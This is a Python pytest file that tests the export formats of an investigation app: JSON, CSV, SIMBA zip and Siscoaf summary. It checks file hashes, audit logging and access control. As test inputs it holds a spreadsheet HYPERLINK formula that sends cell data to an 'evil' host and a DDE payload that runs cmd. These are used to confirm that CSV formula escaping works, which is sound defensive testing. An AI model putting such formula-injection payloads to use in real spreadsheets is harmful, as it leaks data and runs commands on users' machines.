"""Exports (F4.6): package with trace method and file hashes, M4-safe CSV,
SIMBA that the F2.4 preset reads back, Siscoaf summary and audit."""

import csv
import io
import json
import sys
import zipfile
from pathlib import Path

import pytest

try:
    import gsql2rsql  # noqa: F401
except ImportError:
    from unittest.mock import MagicMock as _MagicMock

    for _name in (
        "gsql2rsql",
        "gsql2rsql.parser",
        "gsql2rsql.parser.opencypher_parser",
        "gsql2rsql.planner",
        "gsql2rsql.planner.logical_plan",
        "gsql2rsql.planner.subquery_flattening",
        "gsql2rsql.planner.pass_manager",
        "gsql2rsql.renderer",
        "gsql2rsql.renderer.sql_renderer",
        "gsql2rsql.renderer.schema_provider",
        "gsql2rsql.common",
        "gsql2rsql.common.schema",
    ):
        sys.modules[_name] = _MagicMock()

from fastapi import FastAPI  # noqa: E402
from fastapi.testclient import TestClient  # noqa: E402

from graphlagoon.app import create_api_router  # noqa: E402
from graphlagoon.config import get_settings  # noqa: E402
from graphlagoon.db.memory_store import InMemoryStore  # noqa: E402
from graphlagoon.middleware import auth  # noqa: E402
from graphlagoon.services import file_mapping, investigation_storage, snapshot  # noqa: E402
from graphlagoon.services.blob_storage import LocalBlobStore  # noqa: E402
from graphlagoon.services.file_mapping_presets import SIMBA_V31  # noqa: E402
from graphlagoon.services.snapshot import LocalSnapshotService  # noqa: E402
from graphlagoon.utils.csv_safe import safe_cell, safe_cell_text  # noqa: E402

OWNER = "owner@example.com"
OUTSIDER = "outsider@example.com"
SIMBA = Path(__file__).resolve().parents[2] / "frontend/src/__tests__/fixtures/fileMapping/simba-mini"
HYPERLINK = '=HYPERLINK("http://evil/?"&A1,"Click")'


def h(email):
    return {"X-Forwarded-Email": email}


@pytest.fixture
def ctx(monkeypatch, tmp_path):
    if not SIMBA.is_dir():
        pytest.skip("frontend fixtures not checked out")
    monkeypatch.setenv("GRAPH_LAGOON_DEV_MODE", "true")
    get_settings.cache_clear()
    InMemoryStore.reset()
    auth._agent_request_times.clear()
    monkeypatch.setattr(investigation_storage, "_store", LocalBlobStore(str(tmp_path)))
    svc = LocalSnapshotService(str(tmp_path / "snaps"))
    monkeypatch.setattr(snapshot, "get_snapshot_service", lambda: svc)
    app = FastAPI()
    app.add_middleware(auth.AuthMiddleware)
    app.include_router(create_api_router())
    client = TestClient(app)
    url = "/api/investigations/" + client.post(
        "/api/investigations", json={"title": HYPERLINK, "description": "Golpe Pix"}, headers=h(OWNER)
    ).json()["id"]
    ids = []
    for p in sorted(SIMBA.glob("*.TXT")):
        r = client.post(f"{url}/files", content=p.read_bytes(),
                        params={"filename": p.name, "role": "graph"}, headers=h(OWNER))
        ids.append(r.json()["id"])
    r = client.post(f"{url}/files/{ids[0]}/context",
                    json={"mapping": SIMBA_V31, "file_ids": ids[1:]}, headers=h(OWNER))
    assert r.status_code == 201, r.text
    client.post(f"{url}/evidence", headers=h(OWNER), json={
        "title": "Rastreio FIFO", "kind": "trace", "snapshot": {},
        "params": {"direction": "forward", "allocation": "fifo", "maxHops": 3},
    })
    yield client, url
    InMemoryStore.reset()
    get_settings.cache_clear()


def test_safe_cell_mirrors_the_frontend_rule():
    for raw in ("=1+1", HYPERLINK, "+SUM(A1:A2)", "-2+3+cmd|' /C calc'!A0", "@SUM(A1)", "\t=1", "\r=1"):
        assert safe_cell(raw) == f"'{raw}"
    for raw in ("-5", "+5", "-1.25", "-.5", "+1.5e3", "-2E-7", "42", "Alice", "a=b", " =1", ""):
        assert safe_cell(raw) == raw
    assert safe_cell(-5) == -5 and safe_cell_text(-5) == "-5"
    assert safe_cell_text(None) == "" and safe_cell_text(False) == "false"
    assert safe_cell_text("=x") == "'=x"


def test_json_package_carries_trace_method_file_hashes_and_is_audited(ctx):
    client, url = ctx
    r = client.get(f"{url}/export", params={"format": "json"}, headers=h(OWNER))
    assert r.status_code == 200, r.text
    assert r.headers["content-disposition"].startswith("attachment")
    p = r.json()
    assert {f["filename"] for f in p["files"]} >= {"CASO1_EXTRATO.TXT"}
    assert all(len(f["sha256"]) == 64 for f in p["files"])
    assert p["trace_methods"][0]["method"]["allocation"] == "fifo"
    assert p["frozen_hash"] is None and p["frozen_hash_valid"] is None

    client.post(f"{url}/decision", json={"outcome": "comunicar", "rationale": "ok"}, headers=h(OWNER))
    p = client.get(f"{url}/export", headers=h(OWNER)).json()
    assert p["frozen_hash"] and p["frozen_hash_valid"] is True

    logs = [e for e in InMemoryStore.get_instance().usage_logs if e.action == "investigation.export"]
    assert len(logs) == 2 and logs[0].log_metadata["format"] == "json"
    assert logs[0].log_metadata["sha256"] == r.headers["x-content-sha256"]


def test_csv_is_formula_safe(ctx):
    client, url = ctx
    r = client.get(f"{url}/export", params={"format": "csv"}, headers=h(OWNER))
    assert r.status_code == 200
    rows = list(csv.reader(io.StringIO(r.content.decode("utf-8-sig"))))
    assert rows[0][:2] == ["section", "id"]
    case_row = next(row for row in rows if row[0] == "case")
    assert case_row[2] == f"'{HYPERLINK}"
    assert any(row[0] == "file" and len(row[4]) == 64 for row in rows)
    assert any(row[0] == "evidence" and '"allocation": "fifo"' in row[5] for row in rows)


def _edges(graph):
    return sorted(
        (e["src"], e["dst"], e["relationship_type"], json.dumps(e["properties"], sort_keys=True))
        for e in graph["edges"]
    )


def test_simba_reads_back_with_the_f24_preset(ctx):
    client, url = ctx
    r = client.get(f"{url}/export", params={"format": "simba"}, headers=h(OWNER))
    assert r.status_code == 200 and r.headers["content-type"] == "application/zip"
    z = zipfile.ZipFile(io.BytesIO(r.content))
    texts = {n: z.read(n).decode("latin-1") for n in z.namelist() if n.endswith(".TXT")}
    manifest = json.loads(z.read("MANIFEST.json"))
    assert manifest["skipped_without_account"] == 0
    assert manifest["trace_methods"] and manifest["case_files"][0]["sha256"]

    original = file_mapping.interpret(
        SIMBA_V31, {p.name: p.read_text("latin-1") for p in SIMBA.glob("*.TXT")}
    )["graph"]
    back = file_mapping.interpret(SIMBA_V31, texts)
    assert back["report"]["rows_discarded"] == 0 and not back["report"]["missing_inputs"]
    assert _edges(back["graph"]) == _edges(original)
    assert {(n["node_id"], n["node_type"]) for n in back["graph"]["nodes"]} == {
        (n["node_id"], n["node_type"]) for n in original["nodes"]
    }


def test_siscoaf_summary(ctx):
    client, url = ctx
    s = client.get(f"{url}/export", params={"format": "siscoaf"}, headers=h(OWNER)).json()
    assert s["format"] == "siscoaf-summary" and s["ready_to_communicate"] is False
    assert s["evidence"][0]["label"] == "E1" and s["files"]
    assert client.get(f"{url}/export", params={"format": "pdf"}, headers=h(OWNER)).status_code == 422
    assert client.get(f"{url}/export", headers=h(OUTSIDER)).status_code == 404
